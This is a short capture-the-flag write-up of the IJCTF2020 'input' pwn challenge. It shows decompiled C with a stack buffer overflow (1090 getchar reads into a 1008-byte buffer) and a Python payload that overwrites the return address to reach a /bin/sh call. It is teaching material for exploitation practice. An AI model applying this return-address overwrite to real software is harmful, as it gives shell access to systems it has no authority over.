
## input
### Description


### Attachment

[input](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/IJCTF2020/pwn/input/input)

### Analysis

#### buffer overflow

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3){
  unsigned int v3; // eax
  __int64 v4; // rax
  char fd; // [rsp+0h] [rbp-640h]
  char v7[1008]; // [rsp+210h] [rbp-430h]
  int rnd1; // [rsp+600h] [rbp-40h]
  int rnd2; // [rsp+604h] [rbp-3Ch]
  int rnd3; // [rsp+608h] [rbp-38h]
  int rnd4; // [rsp+60Ch] [rbp-34h]
  int rnd5; // [rsp+610h] [rbp-30h]
  int chr; // [rsp+61Ch] [rbp-24h]
  __int64 const_4; // [rsp+620h] [rbp-20h]
  int j; // [rsp+628h] [rbp-18h]
  int i; // [rsp+62Ch] [rbp-14h]

  const_4 = 4LL;
  v3 = sub_401371(8u, 4);
  std::basic_ifstream<char,std::char_traits<char>>::basic_ifstream(&fd, "/dev/urandom", v3);
  for ( i = 0; i <= 4; ++i )
    std::istream::read(&fd, &rnd1 + 4 * i, const_4);
  if ( rnd1 == rnd2 && rnd2 == rnd3 && rnd3 == rnd4 && rnd4 == rnd5 )
    execve("/bin/sh", 0LL, 0LL);
  std::operator<<<std::char_traits<char>>(&std::cout, "Input: ");
  for ( j = 0; j <= 1089; ++j )
  {
    chr = getchar();
    v7[j] = chr;
  }
  v4 = std::operator<<<std::char_traits<char>>(&std::cout, v7);
  std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
  std::basic_ifstream<char,std::char_traits<char>>::~basic_ifstream(&fd);
  return 0LL;
}
```

`getchar` 1089 times to `v7[1008]`

### Solution

```python
offset = 1048
payload = cyclic(offset)
payload += '\x37'
payload += p64(0x0401253)
payload = payload.ljust(0x441,'A')
# debug('b *0x40129e')
sl(payload)
```




### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/IJCTF2020/pwn/input) 


